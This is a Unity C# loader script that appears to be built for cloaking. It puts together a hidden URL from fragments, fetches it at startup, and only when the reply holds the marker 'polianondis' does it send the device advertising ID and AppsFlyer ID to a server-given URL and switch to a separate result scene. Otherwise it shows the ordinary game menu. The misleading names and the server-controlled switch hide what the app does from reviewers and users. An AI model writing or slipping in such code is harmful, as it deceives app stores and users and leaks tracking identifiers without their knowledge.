using System;
using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class LoadPreScene : MonoBehaviour
{
    public List<string> uniclodeStrings;
    [HideInInspector] public string notPremach = "";
    [HideInInspector] public string prevPrematch = "";

    private void Awake()
    {
        if (PlayerPrefs.GetInt("idcollectedfa") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { notPremach = advertisingId; });
        }
    }

    public void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("keysUsefullCloud", string.Empty) != string.Empty)
            {
                CleosPreloadLight(PlayerPrefs.GetString("keysUsefullCloud"));
            }
            else
            {
                foreach (string item in uniclodeStrings)
                {
                    prevPrematch += item;
                }
                StartCoroutine(InitMenuGame());
            }
        }
        else
        {
            switchmore();
        }
    }

    private void switchmore()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene("MenuScene");
    }

    private IEnumerator InitMenuGame()
    {
        using (UnityWebRequest cloudLoad = UnityWebRequest.Get(prevPrematch))
        {
            cloudLoad.timeout = 4;
            yield return cloudLoad.SendWebRequest();
            if (cloudLoad.isNetworkError)
            {
                switchmore();
            }
            try
            {
                if (cloudLoad.result == UnityWebRequest.Result.Success)
                {
                    if (cloudLoad.downloadHandler.text.Contains("polianondis"))
                    {
                        try
                        {
                            var keyloadscene = cloudLoad.downloadHandler.text.Split('|');
                            CleosPreloadLight(keyloadscene[0] + "?idfa=" + notPremach, Convert.ToInt32(keyloadscene[1]), int.Parse(keyloadscene[2]));
                        }
                        catch
                        {

                            CleosPreloadLight(cloudLoad.downloadHandler.text + "?idfa=" + notPremach + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId());
                        }
                    }
                    else
                    {
                        switchmore();
                    }
                }
                else
                {
                    switchmore();
                }
            }
            catch
            {
                switchmore();
            }
        }
    }

    private void CleosPreloadLight(string collectredInfo, int backb = 0, int pix = 70)
    {
        NotHandledParams.stringClouded = collectredInfo;
        NotHandledParams.FirstCall = backb;
        NotHandledParams.SecondCall = pix;
        SceneManager.LoadScene("ResultPagesLoaded");
    }
}